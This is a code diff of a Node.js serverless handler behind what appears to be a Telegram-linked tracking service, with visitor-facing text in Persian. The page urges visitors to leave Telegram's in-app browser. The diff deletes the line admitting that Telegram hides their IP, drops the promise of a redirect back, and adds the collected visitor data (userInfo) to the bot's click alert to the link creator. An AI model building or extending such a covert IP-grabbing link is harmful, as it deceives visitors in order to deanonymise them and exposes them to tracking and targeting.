@@ -66,7 +66,6 @@ module.exports = async (req, res) => {
         <body>
             <div class="warning">
                 <h2>⛔ برای ادامه لطفا از مرورگر معمولی استفاده کنید</h2>
-                <p>تلگرام IP شما را مخفی می‌کند</p>
             </div>
             
             <div class="steps">
@@ -76,7 +75,6 @@ module.exports = async (req, res) => {
                     ${req.url}
                 </p>
                 <p>2. آن را در مرورگر معمولی (Chrome, Firefox, Safari) باز کنید</p>
-                <p>3. سپس به تلگرام منتقل خواهید شد</p>
             </div>
             
             <p><a href="#" onclick="copyLink()" style="background:#0984e3;color:white;padding:10px 20px;border-radius:5px;text-decoration:none">
@@ -110,6 +108,8 @@ module.exports = async (req, res) => {
         bot.api.sendMessage(
             creatorId, 
             `🔔 اعلان کلیک! شخصی روی لینک شما (${linkId}) کلیک کرد.
+            
+            ${JSON.stringify(userInfo, null, 2)}
             `
         ).catch(e => console.error("Error sending notification:", e));
         
